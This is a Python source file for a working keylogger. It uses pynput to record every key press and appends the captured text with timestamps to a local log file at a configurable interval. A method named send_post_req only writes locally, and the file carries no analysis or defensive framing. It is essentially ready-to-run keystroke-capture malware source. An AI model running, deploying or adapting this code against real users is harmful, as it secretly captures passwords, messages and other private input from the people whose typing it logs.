from pynput import keyboard
import threading
import datetime
import os
import threading
import time
from pathlib import Path

class Keylogger:
    DEFAULTS = {
            "enabled": "true",
            "log_file": "keylogger.log",
            "poll_seconds": "10",
        }
    def __init__(self, config_path=None):
        self.config_path = Path(config_path or Path(__file__).with_name("config.txt"))
        self.config = self._read_config()
        self.log_path = self._resolve_path(self.config["log_file"])
        self.text = ""

    def _read_config(self):
        values = self.DEFAULTS.copy()
        if self.config_path.exists():
            for raw_line in self.config_path.read_text(encoding="utf-8-sig").splitlines():
                line = raw_line.strip()
                if not line or line.startswith(("#", ";")) or "=" not in line:
                    continue
                key, value = line.split("=", 1)
                key = key.strip().lower()
                if key in values:
                    values[key] = value.strip()
        return values
    def _bool(self, key):
        return self.config[key].lower() in {"1", "true", "yes", "on"}
    def _resolve_path(self, value):
        path = Path(os.path.expandvars(os.path.expanduser(value)))
        if not path.is_absolute():
            path = self.config_path.parent / path
        return path.resolve()   
    def send_post_req(self):
        
        try:
            with open(self.log_path, "a", encoding="utf-8") as archivo:
                if self.text == "":
                    archivo.write(f"\n[{datetime.datetime.now().isoformat(timespec='seconds')}] --- IGNORE ---\n")

                archivo.write(f"\n[{datetime.datetime.now().isoformat(timespec='seconds')}] {self.text}")
                self.text = ""
            
            timer = threading.Timer(float(self.config["poll_seconds"]), self.send_post_req)
            timer.start()
        except:
            print("Couldn't complete request!")

    def on_press(self, key):

        if key == keyboard.Key.enter:
            self.text += "\n"
        elif key == keyboard.Key.tab:
            self.text += "\t"
        elif key == keyboard.Key.space:
            self.text += " "
        elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
            pass
        elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            self.text += "[CTRL]+"
        elif key == keyboard.Key.alt or key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
            self.text += "[ALT]+"
        elif key == keyboard.Key.backspace:
            self.text += "[BASKSPACE]"
        elif key == keyboard.Key.esc:
            return False
        else:
            if hasattr(key, 'char') and key.char is not None:
                if 1 <= ord(key.char) <= 26:
                    letra = chr(ord(key.char) + 96)
                    self.text += letra
                else:
                    self.text += key.char
            else:
                self.text += f"[{str(key).replace('Key.', '')}]"

    def start(self):
        if not self._bool("enabled"):
            print("[INFO] Keylogger is disabled in the configuration.")
            return
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            self.send_post_req()
            self.listener = listener
            self.listener.join()
    def stop(self):
        if hasattr(self, 'listener') and self.listener is not None:
            self.listener.stop()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
    
        
    

